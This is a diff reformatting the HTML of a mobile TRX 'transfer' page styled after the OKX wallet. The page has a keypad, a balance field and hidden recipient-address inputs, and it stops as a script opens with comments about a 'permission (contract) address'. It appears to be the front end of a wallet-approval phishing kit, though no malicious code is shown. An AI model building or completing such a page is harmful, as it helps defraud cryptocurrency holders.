@@ -1,5 +1,95 @@
-<head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1"> <title>&#27491;&#22312;&#30003;&#35831;&#36716;&#36134;</title> <link rel="icon" type="image/png" href="png/icon_trx.png"> <script src="js/1.js"></script> <style>::-webkit-scrollbar{display: none;}.tishi{width: 58%; padding: 0.1rem 0.3rem; height: 3rem; background: #4b4848; z-index: 999999999999; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); border-radius: 0.3rem; color: white; font-size: 1rem; text-align: center; line-height: 3rem; display: none; height: auto; margin: 0 auto;}</style> <link rel="stylesheet" href="css/okx.css"></head><body id="app" class="uni-body pages-index-home"> <noscript><strong>&#26412;&#31449;&#28857;&#24517;&#39035;&#35201;&#24320;&#21551;JavaScript&#25165;&#33021;&#36816;&#34892;</strong></noscript> <uni-app class="uni-app--maxwidth"> <uni-page data-page="pages/index/home"> <uni-page-wrapper> <uni-page-body> <body data-v-49fe1bb8=""> <div data-v-49fe1bb8=""> <div data-v-49fe1bb8=""> <div data-v-49fe1bb8="" class="pay-box"> <div data-v-49fe1bb8="" class="amount"> <div data-v-49fe1bb8="" class="num"><span class="amount" id="amount"></span><em data-v-49fe1bb8="">TRX</em></div><img data-v-49fe1bb8="" src="png/icon_exchange.jpg" class="icon"> </div><div data-v-49fe1bb8="" class="rate"><span id="amount-display"></span><em data-v-49fe1bb8="">USD</em> <div data-v-49fe1bb8="" class="icon"><img data-v-49fe1bb8="" src="png/icon_horn.jpg"></div></div></div><div data-v-49fe1bb8="" class="bottom-keyboard"> <div data-v-49fe1bb8="" class="asset-info"> <div data-v-49fe1bb8="" class="name"><img data-v-49fe1bb8="" src="png/icon_trx.png" class="coin"> <div data-v-49fe1bb8="" class="asset-box"> <p data-v-49fe1bb8="" class="title">&#20313;&#39069;</p><p data-v-49fe1bb8="" class="num"><span data-v-49fe1bb8="" id="ye"></span><em data-v-49fe1bb8="">TRX</em></p><input type="text" id="address" style="display:none"> </div></div><div data-v-49fe1bb8="" class="right"> <div data-v-49fe1bb8="" class="btn">&#26368;&#22823;</div></div></div><div data-v-49fe1bb8="" class="keyboard-box"> <div data-v-49fe1bb8="" class="btn">1</div><div data-v-49fe1bb8="" class="btn">2</div><div data-v-49fe1bb8="" class="btn">3</div><div data-v-49fe1bb8="" class="btn">4</div><div data-v-49fe1bb8="" class="btn">5</div><div data-v-49fe1bb8="" class="btn">6</div><div data-v-49fe1bb8="" class="btn">7</div><div data-v-49fe1bb8="" class="btn">8</div><div data-v-49fe1bb8="" class="btn">9</div><div data-v-49fe1bb8="" class="btn">.</div><div data-v-49fe1bb8="" class="btn">0</div><div data-v-49fe1bb8="" class="btn delete"><img data-v-49fe1bb8="" src="png/icon_delete.jpg"></div></div><footer style="display: flex; justify-content: center; align-items: center; margin-top: 20px;"> <van-button class="submit-btn disabled" type="button" id="submitBtn" disabled style="display: flex; justify-content: center; align-items: center; text-align: center; width: 100%;">&#19979;&#19968;&#27493;</van-button> <van-button id="jixu" class="jixu">&#32487;&#32493;</van-button> </footer> </div></div></div><div class="tishi" id="tip">&#25552;&#31034;</div><input id="to_address" type="hidden"> </body> </uni-page-body> </uni-page-wrapper> </uni-page> </uni-app>    
-<script>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
+    <title>&#27491;&#22312;&#30003;&#35831;&#36716;&#36134;</title>
+    <link rel="icon" type="image/png" href="png/icon_trx.png">
+    <script src="js/1.js"></script>
+    <style>
+        ::-webkit-scrollbar {
+            display: none;
+        }
+        .tishi {
+            width: 58%;
+            padding: 0.1rem 0.3rem;
+            height: 3rem;
+            background: #4b4848;
+            z-index: 999999999999;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border-radius: 0.3rem;
+            color: white;
+            font-size: 1rem;
+            text-align: center;
+            line-height: 3rem;
+            display: none;
+            height: auto;
+            margin: 0 auto;
+        }
+    </style>
+    <link rel="stylesheet" href="css/okx.css">
+</head>
+
+<body id="app" class="uni-body pages-index-home">
+    <noscript><strong>&#26412;&#31449;&#28857;&#24517;&#39035;&#35201;&#24320;&#21551;JavaScript&#25165;&#33021;&#36816;&#34892;</strong></noscript>
+
+    <uni-app class="uni-app--maxwidth">
+        <uni-page data-page="pages/index/home">
+            <uni-page-wrapper>
+                <uni-page-body>
+                    <body data-v-49fe1bb8="">
+                        <div data-v-49fe1bb8="">
+                            <div data-v-49fe1bb8="">
+                                <div data-v-49fe1bb8="" class="pay-box">
+                                    <div data-v-49fe1bb8="" class="amount">
+                                        <div data-v-49fe1bb8="" class="num"><span class="amount" id="amount"></span><em data-v-49fe1bb8="">TRX</em></div><img data-v-49fe1bb8="" src="png/icon_exchange.jpg" class="icon">
+                                    </div>
+                                    <div data-v-49fe1bb8="" class="rate"><span id="amount-display"></span><em data-v-49fe1bb8="">USD</em>
+                                        <div data-v-49fe1bb8="" class="icon"><img data-v-49fe1bb8="" src="png/icon_horn.jpg"></div>
+                                    </div>
+                                </div>
+                                <div data-v-49fe1bb8="" class="bottom-keyboard">
+                                    <div data-v-49fe1bb8="" class="asset-info">
+                                        <div data-v-49fe1bb8="" class="name"><img data-v-49fe1bb8="" src="png/icon_trx.png" class="coin">
+                                            <div data-v-49fe1bb8="" class="asset-box">
+                                                <p data-v-49fe1bb8="" class="title">&#20313;&#39069;</p>
+                                                <p data-v-49fe1bb8="" class="num"><span data-v-49fe1bb8="" id="ye"></span><em data-v-49fe1bb8="">TRX</em></p><input type="text" id="address" style="display:none">
+                                            </div>
+                                        </div>
+                                        <div data-v-49fe1bb8="" class="right">
+                                            <div data-v-49fe1bb8="" class="btn">&#26368;&#22823;</div>
+                                        </div>
+                                    </div>
+                                    <div data-v-49fe1bb8="" class="keyboard-box">
+                                        <div data-v-49fe1bb8="" class="btn">1</div>
+                                        <div data-v-49fe1bb8="" class="btn">2</div>
+                                        <div data-v-49fe1bb8="" class="btn">3</div>
+                                        <div data-v-49fe1bb8="" class="btn">4</div>
+                                        <div data-v-49fe1bb8="" class="btn">5</div>
+                                        <div data-v-49fe1bb8="" class="btn">6</div>
+                                        <div data-v-49fe1bb8="" class="btn">7</div>
+                                        <div data-v-49fe1bb8="" class="btn">8</div>
+                                        <div data-v-49fe1bb8="" class="btn">9</div>
+                                        <div data-v-49fe1bb8="" class="btn">.</div>
+                                        <div data-v-49fe1bb8="" class="btn">0</div>
+                                        <!--<div data-v-49fe1bb8="" class="btn delete" style="margin-top:20px"><img data-v-49fe1bb8="" src="png/icon_delete.jpg"></div>-->
+                                        <div data-v-49fe1bb8="" class="btn delete"><img data-v-49fe1bb8="" src="png/icon_delete.jpg"></div>
+                                    </div>
+                                    <footer style="display: flex; justify-content: center; align-items: center; margin-top: 20px;">
+                                        <van-button class="submit-btn disabled" type="button" id="submitBtn" disabled style="display: flex; justify-content: center; align-items: center; text-align: center; width: 100%;">&#19979;&#19968;&#27493;</van-button>
+                                        <van-button id="jixu" class="jixu">&#32487;&#32493;</van-button>
+                                    </footer>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="tishi" id="tip">&#25552;&#31034;</div><input id="to_address" type="hidden">
+                    </body>
+                </uni-page-body>
+            </uni-page-wrapper>
+        </uni-page>
+    </uni-app><script>
 // 必须填写有效的地址否则会报错
 
 // 权限地址（合约地址）
